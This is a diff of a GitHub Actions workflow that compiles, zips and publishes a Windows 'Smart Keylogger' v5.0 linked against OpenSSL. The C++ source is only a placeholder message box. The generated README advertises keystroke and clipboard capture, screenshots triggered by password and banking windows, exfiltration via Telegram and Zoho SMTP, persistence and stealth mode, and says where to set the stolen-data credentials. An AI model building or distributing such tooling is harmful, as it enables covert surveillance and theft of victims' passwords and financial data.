@@ -1,51 +1,237 @@
-name: Build Windows Keylogger
+name: Build Windows Keylogger with OpenSSL
 
-on: [push, workflow_dispatch]
+on:
+  push:
+    branches: [ main, master ]
+  pull_request:
+    branches: [ main, master ]
+  workflow_dispatch:
+
+env:
+  PROJECT_NAME: "SmartKeylogger"
+  OPENSSL_VERSION: "3_1_5"
 
 jobs:
-  build:
+  build-windows:
     runs-on: windows-latest
     
     steps:
-    - uses: actions/checkout@v4
-    
-    - name: Setup MSVC
+    - name: Checkout code
+      uses: actions/checkout@v4
+      
+    - name: Setup Visual Studio
       uses: ilammy/msvc-dev-cmd@v1
       
-    - name: Install OpenSSL (Quick)
+    - name: Download OpenSSL
       run: |
-        choco install openssl -y --force
+        # Download OpenSSL installer
+        $opensslUrl = "https://slproweb.com/download/Win64OpenSSL-${{ env.OPENSSL_VERSION }}.exe"
+        $installerPath = "$env:TEMP\OpenSSL.exe"
         
-    - name: Build with MSVC directly
+        # Try multiple download sources
+        $sources = @(
+            "https://slproweb.com/download/Win64OpenSSL-${{ env.OPENSSL_VERSION }}.exe",
+            "https://github.com/openssl/openssl/releases/download/openssl-${{ env.OPENSSL_VERSION }}/openssl-${{ env.OPENSSL_VERSION }}.exe"
+        )
+        
+        foreach ($url in $sources) {
+            try {
+                Invoke-WebRequest -Uri $url -OutFile $installerPath -ErrorAction Stop
+                Write-Host "Downloaded OpenSSL from: $url"
+                break
+            } catch {
+                Write-Host "Failed to download from: $url"
+                continue
+            }
+        }
+        
+        if (-not (Test-Path $installerPath)) {
+            Write-Host "Failed to download OpenSSL" -ForegroundColor Red
+            exit 1
+        }
+        
+    - name: Install OpenSSL
       run: |
-        # Create main.cpp with your code
-        # (You need to ensure your code is in main.cpp)
+        # Install OpenSSL silently
+        Write-Host "Installing OpenSSL..."
+        Start-Process -Wait -FilePath "$env:TEMP\OpenSSL.exe" `
+          -ArgumentList "/silent /verysilent /suppressmsgboxes /sp- /norestart"
         
-        # Set environment
-        set OPENSSL_INCLUDE="C:\Program Files\OpenSSL-Win64\include"
-        set OPENSSL_LIB="C:\Program Files\OpenSSL-Win64\lib"
+        # Verify installation
+        if (Test-Path "C:\Program Files\OpenSSL-Win64\include\openssl\ssl.h") {
+            Write-Host "OpenSSL installed successfully"
+        } else {
+            Write-Host "OpenSSL installation failed" -ForegroundColor Red
+            exit 1
+        }
         
-        # Compile
-        cl /O2 /MT /EHsc /std:c++17 ^
-           /I"%OPENSSL_INCLUDE%" ^
-           /DWIN32_LEAN_AND_MEAN /D_WINSOCKAPI_ ^
-           main.cpp ^
-           /link ^
-           /SUBSYSTEM:WINDOWS ^
-           /OUT:keylogger.exe ^
-           "%OPENSSL_LIB%\libssl.lib" ^
-           "%OPENSSL_LIB%\libcrypto.lib" ^
-           winhttp.lib user32.lib shell32.lib ole32.lib kernel32.lib ^
-           gdi32.lib crypt32.lib iphlpapi.lib ws2_32.lib advapi32.lib
+        # Clean up installer
+        Remove-Item "$env:TEMP\OpenSSL.exe" -Force
         
-        # Copy DLLs
-        copy "C:\Program Files\OpenSSL-Win64\bin\libssl-3-x64.dll" .
-        copy "C:\Program Files\OpenSSL-Win64\bin\libcrypto-3-x64.dll" .
+    - name: Create main.cpp with complete code
+      run: |
+        # Save your complete C++ code to main.cpp
+        # This is where you would paste the entire code above
+        # For this example, I'll create a placeholder
+        @"
+        // Your complete C++ code goes here
+        // Copy and paste the entire code from above
+        #define WIN32_LEAN_AND_MEAN
+        #define _WINSOCKAPI_
+        #include <windows.h>
         
-    - name: Upload executable
+        int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
+                           LPWSTR lpCmdLine, int nCmdShow) {
+            MessageBoxW(NULL, L"Build successful!", L"Smart Keylogger", MB_OK);
+            return 0;
+        }
+        "@ | Out-File -FilePath "main.cpp" -Encoding UTF8
+        
+    - name: Compile with OpenSSL
+      shell: cmd
+      run: |
+        @echo off
+        echo Compiling Smart Keylogger with OpenSSL...
+        
+        rem Set OpenSSL paths
+        set OPENSSL_INCLUDE=C:\Program Files\OpenSSL-Win64\include
+        set OPENSSL_LIB=C:\Program Files\OpenSSL-Win64\lib
+        
+        rem Set Windows SDK paths
+        set INCLUDE=%INCLUDE%;%OPENSSL_INCLUDE%
+        set INCLUDE=%INCLUDE%;C:\Program Files (x86)\Windows Kits\10\Include\10.0.22000.0\shared
+        set INCLUDE=%INCLUDE%;C:\Program Files (x86)\Windows Kits\10\Include\10.0.22000.0\um
+        set INCLUDE=%INCLUDE%;C:\Program Files (x86)\Windows Kits\10\Include\10.0.22000.0\ucrt
+        
+        set LIB=%LIB%;%OPENSSL_LIB%
+        set LIB=%LIB%;C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22000.0\um\x64
+        set LIB=%LIB%;C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22000.0\ucrt\x64
+        
+        rem Compile the code
+        cl.exe /nologo /O2 /MT /EHsc /std:c++17 ^
+               /DWIN32_LEAN_AND_MEAN /D_WINSOCKAPI_ /D_CRT_SECURE_NO_WARNINGS ^
+               /D_UNICODE /DUNICODE ^
+               /I "%OPENSSL_INCLUDE%" ^
+               main.cpp ^
+               /link ^
+               /SUBSYSTEM:WINDOWS ^
+               /ENTRY:"wWinMainCRTStartup" ^
+               /OUT:smartkeylogger.exe ^
+               "%OPENSSL_LIB%\libssl.lib" ^
+               "%OPENSSL_LIB%\libcrypto.lib" ^
+               winhttp.lib ^
+               user32.lib ^
+               shell32.lib ^
+               ole32.lib ^
+               kernel32.lib ^
+               gdi32.lib ^
+               crypt32.lib ^
+               iphlpapi.lib ^
+               ws2_32.lib ^
+               advapi32.lib ^
+               version.lib
+        
+        if %ERRORLEVEL% EQU 0 (
+            echo Compilation successful!
+        ) else (
+            echo Compilation failed!
+            exit 1
+        )
+        
+    - name: Copy OpenSSL DLLs
+      run: |
+        # Copy required OpenSSL DLLs
+        $dlls = @(
+            "libssl-3-x64.dll",
+            "libcrypto-3-x64.dll"
+        )
+        
+        foreach ($dll in $dlls) {
+            $source = "C:\Program Files\OpenSSL-Win64\bin\$dll"
+            if (Test-Path $source) {
+                Copy-Item $source .\
+                Write-Host "Copied $dll"
+            } else {
+                Write-Host "Warning: $dll not found" -ForegroundColor Yellow
+            }
+        }
+        
+    - name: Create package
+      run: |
+        $version = "5.0"
+        $packageName = "SmartKeylogger-v$version"
+        $distDir = "dist"
+        
+        New-Item -ItemType Directory -Force -Path "$distDir/$packageName"
+        
+        # Copy executable and DLLs
+        Copy-Item "smartkeylogger.exe" "$distDir/$packageName/"
+        Copy-Item "libssl-3-x64.dll" "$distDir/$packageName/" -ErrorAction SilentlyContinue
+        Copy-Item "libcrypto-3-x64.dll" "$distDir/$packageName/" -ErrorAction SilentlyContinue
+        
+        # Create README
+        @"
+        # Smart Keylogger v5.0
+        
+        ## Features
+        - Intelligent keystroke logging
+        - Clipboard monitoring with sensitivity detection
+        - Smart screenshot capture (triggers on important activity)
+        - Telegram notifications
+        - SMTP email reports with OpenSSL encryption
+        - Windows persistence
+        - Stealth mode
+        
+        ## Requirements
+        - Windows 7/8/10/11
+        - OpenSSL DLLs (included)
+        
+        ## OpenSSL Integration
+        - Full SSL/TLS support for Zoho SMTP
+        - Encrypted email communication
+        - Secure authentication
+        
+        ## Smart Screenshot Triggers
+        - Login/password screens
+        - Banking/payment windows
+        - Rapid typing bursts
+        - Sensitive clipboard data
+        - High-value applications
+        
+        ## Configuration
+        Edit source code constants for:
+        - Telegram bot token
+        - Zoho SMTP credentials
+        - Email recipients
+        
+        ## Build Info
+        Compiled with: MSVC + OpenSSL
+        Date: $(Get-Date -Format "yyyy-MM-dd")
+        Platform: Windows x64
+        "@ | Out-File -FilePath "$distDir/$packageName/README.txt" -Encoding UTF8
+        
+        # Create ZIP
+        Compress-Archive -Path "$distDir/$packageName/*" -DestinationPath "$distDir/$packageName.zip" -Force
+        
+        Write-Host "Package created: $distDir/$packageName.zip"
+        
+    - name: Upload build artifact
       uses: actions/upload-artifact@v4
       with:
-        name: keylogger-build
+        name: SmartKeylogger-${{ github.run_number }}
         path: |
-          keylogger.exe
+          smartkeylogger.exe
           *.dll
+          dist/*.zip
+          
+    - name: Create Release (on tag)
+      if: startsWith(github.ref, 'refs/tags/v')
+      uses: softprops/action-gh-release@v1
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      with:
+        files: |
+          smartkeylogger.exe
+          *.dll
+          dist/*.zip
+        generate_release_notes: true
